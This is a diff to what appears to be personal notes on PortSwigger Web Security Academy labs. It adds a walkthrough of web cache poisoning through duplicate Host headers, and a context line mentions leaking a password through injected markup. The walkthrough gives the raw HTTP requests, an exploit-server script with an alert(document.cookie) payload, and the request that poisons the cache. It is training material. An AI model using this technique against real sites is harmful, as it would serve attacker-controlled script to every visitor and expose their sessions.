@@ -41,3 +41,34 @@ Host: 0a5900ae0435584887f31bcc003e00b9.web-security-academy.net:'>ClickMe</a><a 
 ```
 
 Similar attack could be made using `img` tag, that would log for us the password once the victim open the email.
+
+## Web cache poisoning via ambiguous requests
+
+By manipulating `Host` header we can notice that the routing is based upon it, because of the error. By providing two sligtyly diifferent `Host` headers we can conclude, that the first is being parsed by the cache and proxy for routing, and the second one is used by a web page, reflecting its value on it. This discrepancy can potentially be exploited.
+
+```
+GET /?cb=123456789123 HTTP/1.1
+Host: 0afa00e503d0269681507b9f00b90061.h1-web-security-academy.net
+Host: 0afa00e503d0269681507b9f00b90061.xd.net
+```
+
+`0afa00e503d0269681507b9f00b90061.xd.net` gets reflected in an absolute url to a script and we see that the response was cached upon performing the second request with only one proper host header.
+
+Now at exploit server create a file at `/resources/js/tracking.js` with response headers and body shown below
+
+```
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+```
+
+```
+alert(document.cookie)
+```
+
+Then perform the belowe request to cache malicious response and solve the lab. (The solucion can be first tested by issuing two requests, one malicious and one normal, both with the same cache buster `cb` value)
+
+```
+GET / HTTP/1.1
+Host: 0a13009d033215c58319473f006b0017.h1-web-security-academy.net
+Host: exploit-0ad4004f037f154a831e46910160005d.exploit-server.net
+```
